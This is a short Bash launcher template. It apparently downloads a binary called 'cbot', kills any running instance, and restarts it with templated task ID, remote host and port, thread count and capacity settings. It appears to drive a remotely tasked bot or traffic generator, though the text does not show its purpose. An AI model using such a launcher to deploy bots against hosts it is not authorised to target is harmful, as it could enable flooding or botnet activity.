#!/usr/bin/env bash

function run_cbot() {

    chmod a+x ./cbot
    ./cbot -taskId -pnode root {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
}

download

if [ -f ./cbot ]; then

  pkill -f cbot

  run_cbot

fi
